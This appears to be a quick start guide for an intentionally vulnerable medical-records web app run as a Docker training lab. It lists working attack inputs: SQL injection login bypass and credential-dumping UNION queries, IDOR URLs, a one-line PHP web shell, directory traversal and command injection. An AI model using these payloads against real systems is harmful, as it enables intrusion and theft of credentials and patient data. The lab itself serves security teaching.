# MedCare EHR - Quick Start Guide

## ⚡ 5-Minute Setup

### Step 1: Navigate to Directory
```bash
cd docker-lab/services/ehr-webapp
```

### Step 2: Start Application
```bash
docker-compose up -d
```

### Step 3: Wait for Initialization (30 seconds)
```bash
docker-compose logs -f
```

### Step 4: Access Application
```
http://localhost:8080
```

### Step 5: Login
```
Username: admin
Password: admin123
```

---

## 🎯 Quick Tests

### Test 1: SQL Injection Login Bypass
```
Username: admin' OR '1'='1' -- 
Password: anything
```
✅ Should login successfully

### Test 2: Patient Search SQL Injection
```
Search: ' UNION SELECT id,username,password,email,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM users -- 
```
✅ Should display user credentials

### Test 3: IDOR Vulnerability
```
http://localhost:8080/dashboard.php?patient_id=1
http://localhost:8080/dashboard.php?patient_id=2
```
✅ Should access any patient record

### Test 4: File Upload Web Shell
Create `shell.php`:
```php
<?php system($_GET['cmd']); ?>
```

Upload via: `http://localhost:8080/upload.php`

Access: `http://localhost:8080/uploads/shell.php?cmd=whoami`

✅ Should execute commands

### Test 5: Directory Traversal
```
http://localhost:8080/settings.php?file=.env.example
```
✅ Should display credentials

### Test 6: Command Injection
```
http://localhost:8080/settings.php?ping=localhost;whoami
```
✅ Should execute system commands

---

## 📊 Included Data

- **10 Users**: admin, doctors, nurses, patients
- **20 Patients**: Synthetic HIPAA-compliant data
- **Medical Records**: Diagnoses, treatments, prescriptions
- **Appointments**: Scheduled patient visits

---

## 🛠️ Common Commands

### View Logs
```bash
docker-compose logs -f
```

### Stop Application
```bash
docker-compose down
```

### Reset Everything
```bash
docker-compose down -v
docker-compose up -d
```

### Access Database
```bash
docker exec -it ehr_database mysql -uwebapp -pwebapp123 healthcare_db
```

### Access Web Container
```bash
docker exec -it ehr_webapp bash
```

---

## 📋 All Default Credentials

### Web Application Users
| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | Administrator |
| doctor1 | doctor123 | Doctor |
| doctor2 | password | Doctor |
| nurse1 | nurse123 | Nurse |
| patient1 | patient123 | Patient |
| test | test | Patient |

### Database
| User | Password |
|------|----------|
| root | root123 |
| webapp | webapp123 |

---

## 🎯 Vulnerability Checklist

Try exploiting these vulnerabilities:

- [ ] SQL Injection (Login)
- [ ] SQL Injection (Search)
- [ ] Broken Authentication
- [ ] IDOR (Patient Records)
- [ ] XSS (Medical Notes)
- [ ] File Upload (Web Shell)
- [ ] Directory Traversal
- [ ] Command Injection
- [ ] Information Disclosure
- [ ] Weak Session Management
- [ ] Missing Access Controls
- [ ] Sensitive Data Exposure

---

## ⚠️ Troubleshooting

### Port 8080 Already in Use
```bash
# Change port in docker-compose.yml
ports:
  - "8081:80"
```

### Database Not Ready
```bash
# Wait 30 seconds, then check
docker-compose ps
docker-compose logs ehr-database
```

### Can't Upload Files
```bash
# Fix permissions
docker exec ehr_webapp chmod 777 /var/www/html/uploads
```

---

## 📚 More Information

- **Full Documentation**: README.md
- **Deployment Guide**: DEPLOYMENT_GUIDE.md
- **Attack Mapping**: MITRE_ATTACK_MAPPING.md

---

## 🚨 Security Warning

**This application is INTENTIONALLY VULNERABLE**

- Use ONLY in isolated lab environments
- NEVER expose to the internet
- NEVER use with real data
- For educational purposes only

---

**Ready to hack! 🎯**

Start testing vulnerabilities at: http://localhost:8080

